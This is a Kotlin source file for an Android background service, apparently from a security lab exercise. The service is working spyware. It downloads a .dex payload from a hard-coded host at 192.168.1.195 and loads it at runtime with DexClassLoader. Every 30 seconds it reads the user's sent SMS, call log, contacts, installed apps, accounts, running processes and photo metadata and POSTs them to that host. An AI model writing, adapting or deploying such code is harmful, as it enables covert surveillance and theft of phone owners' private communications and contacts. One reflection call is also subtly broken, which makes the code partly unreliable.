package com.example.lab1

import android.accounts.AccountManager
import android.app.ActivityManager
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.provider.CallLog.Calls.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import android.content.ContentUris
import androidx.annotation.RequiresApi
import java.lang.ClassLoader
import java.net.HttpURLConnection
import java.net.URL
import dalvik.system.DexClassLoader
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.*


class Service : Service() {

    private lateinit var mHandler: Handler
    private lateinit var mRunnable: Runnable

    override fun onBind(intent: Intent): IBinder {
        throw UnsupportedOperationException("Not yet implemented")
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {

        toast("Service started.")

        mHandler = Handler()
        mRunnable = Runnable {
            try {
                collectInfo()
            }
            catch (e: Exception) {
                e.printStackTrace()
            }
        }
        mHandler.postDelayed(mRunnable, 5000)
        return START_STICKY
    }

    private fun createFile (buffer: ByteArray) {
        var path = applicationContext.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
        File(path.toString(), "test.dex").delete()
        File(path.toString(), "test.dex").createNewFile()
        File(path.toString(), "test.dex").writeBytes(buffer)
        println(path)
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    public fun collectInfo() {
        println("Requesting dex...")

        Thread {
            var buffer: ByteArray = sendGetRequest()
            createFile(buffer)
            var path = applicationContext.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
            println("Loading .dex file...")
            var filePath = File(path.toString(), "test.dex").toString()
            try {
                var dexLoader = DexClassLoader(filePath, path.toString(),
                        null, ClassLoader.getSystemClassLoader())
                var mClass = dexLoader.loadClass("com.example.lab1.Service")
                // android.content.Context
                var mMethod = mClass.getMethod("collectInfo2", android.content.Context)
                var classInstance = mClass.newInstance()
                mMethod.invoke(classInstance, applicationContext)
            }
            catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()

    }

    @RequiresApi(Build.VERSION_CODES.Q)
    fun collectInfo2(context: Context) {
        println("Collecting info...")

        var postMsg = ""
        postMsg += "SMS Info: \n"
        postMsg += readSMS(context) + "\n"
        postMsg += "System Info: \n"
        postMsg += InfoSystem() + "\n"
        postMsg += "Call log Info: \n"
        postMsg += readCallLog(context) + "\n"
        postMsg += "Contacts Info: \n"
        postMsg += readContactInfo() + "\n"
        postMsg += "Photo list Info: \n"
        postMsg += getPhotoList()

        Thread { sendPostRequest(postMsg) }.start()
        mHandler.postDelayed(mRunnable, 30000)
    }

    private fun InfoSystem(): String {
        val myVersion = Build.VERSION.RELEASE
        val sdkVersion = Build.VERSION.SDK_INT
        var msg = "Version: $myVersion, sdk: $sdkVersion "
        msg += "free memory: " + (Environment.getDataDirectory().usableSpace / (1024 * 1024)).toString() + "Mb\n"

        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in packages) {
            msg += "Installed package :" + packageInfo.packageName + " Source dir : " + packageInfo.sourceDir + "\n"
        }

        val accounts = AccountManager.get(this).accounts
        for (account in accounts) {
            msg += "name: $account \n"
        }

        val activityManager = this.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val infos = activityManager.runningAppProcesses
        for (info in infos) {
            val name = info.processName
            val uid = info.uid
            val pid = info.pid
            msg += "name =$name uid = $uid pid = $pid \n"
        }

        return msg
    }

    override fun onDestroy() {
        super.onDestroy()
        toast("Service destroyed.")
        mHandler.removeCallbacks(mRunnable)
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun getPhotoList(): String {
        var photosList: String = ""

        val imageProjection = arrayOf(
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media._ID
        )
        val collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_INTERNAL)
        val imageSortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        val cursor = contentResolver.query(
            collection,
            imageProjection,
            null,
            null,
            imageSortOrder
        )
        cursor.use {
            it?.let {
                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                while (it.moveToNext()) {
                    val id = it.getLong(idColumn)
                    val name = it.getString(nameColumn)
                    val size = it.getString(sizeColumn)
                    val date = it.getString(dateColumn)
                    photosList += id.toString()
                    photosList += name + size + date
                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                }
            } ?: kotlin.run {
                Log.e("TAG", "Can't traverse photos, cursor is null!")
            }
        }

        return photosList
    }

    private fun readCallLog(context: Context): String {
        var logs = getCallLogs(context)
        var msg = ""
        var allMsg = ""
        var i = 0
        while (true) {
            if (logs.isNotEmpty()) {
                if (logs[i][0] != null) {
                    msg += "name = " + logs[i][0] + ' '
                }
                msg += "number = " + logs[i][1] + ' ' + "type = " + logs[i][2] + ' ' + "date = " + logs[i][3] + ' ' + "duration = " + logs[i][4]
                allMsg += msg + "\n"
                msg = ""
                if (logs.last() == logs[i]) {
                    break
                }
                i++
            }
            else {
                break
            }
        }

        return allMsg
    }

    private fun getCallLogs(context: Context): List<List<String?>> {
        val c = context
        val projection = arrayOf(CACHED_NAME, NUMBER, TYPE, DATE, DURATION)
        val cursor = c.contentResolver.query(
            CONTENT_URI,
            projection,
            null,
            null,
            null,
            null
        )
        return cursorToMatrix(cursor)
    }

    private fun readSMS(context: Context): String {
        val cr: ContentResolver =  context.getContentResolver()
        val cursor = cr.query(Uri.parse("content://sms/sent"), null, null, null, null)
        var allMsg = ""
        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                var msgData = ""
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx) + "\n"
                }
                allMsg += msgData
            } while (cursor.moveToNext())
        } else {
            toast("no sms")
        }

        return allMsg
    }

    private fun sendGetRequest(): ByteArray {
        val client = OkHttpClient()
        val request = Request.Builder().url("http://192.168.1.195:8081/classes.dex")
            .get()
            .build()
        val resp = client.newCall(request).execute()
        return resp.body!!.bytes()
    }

    private fun sendPostRequest(msg: String) {
        val mURL = URL("http://192.168.1.195:8081")
        with(mURL.openConnection() as HttpURLConnection) {
            requestMethod = "POST"
            val wr = OutputStreamWriter(outputStream)
            wr.write(msg)
            wr.flush()
            println("URL : $url")
            println("Response Code : $responseCode")
            BufferedReader(InputStreamReader(inputStream)).use {
                val response = StringBuffer()
                var inputLine = it.readLine()
                while (inputLine != null) {
                    response.append(inputLine)
                    inputLine = it.readLine()
                }
                it.close()
                println("Response : $response")
            }
        }
    }

    private fun cursorToMatrix(cursor: Cursor?): List<List<String?>> {
        val matrix = mutableListOf<List<String?>>()
        cursor?.use {
            while (it.moveToNext()) {
                val list = listOf(
                    it.getStringFromColumn(CACHED_NAME),
                    it.getStringFromColumn(NUMBER),
                    it.getStringFromColumn(TYPE),
                    it.getStringFromColumn(DATE),
                    it.getStringFromColumn(DURATION)
                )
                matrix.add(list.toList())
            }
        }

        return matrix
    }

    private fun Cursor.getStringFromColumn(columnName: String) =
        getString(getColumnIndex(columnName))

    private fun readContactInfo(): String {
        val cr: ContentResolver = applicationContext.contentResolver
        val cur: Cursor? = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
        var contacts = ""
        if ((cur?.count ?: 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                val id: String = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))
                val name: String =
                    cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    val pCur: Cursor? = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(id),
                        null
                    )
                    if (pCur != null) {
                        while (pCur.moveToNext()) {
                            val phoneNo: String = (pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            ))
                            contacts += "$name: $phoneNo\n"
                        }
                    }
                    pCur?.close()
                }
            }
            cur?.close()
        }
        return contacts
    }

}


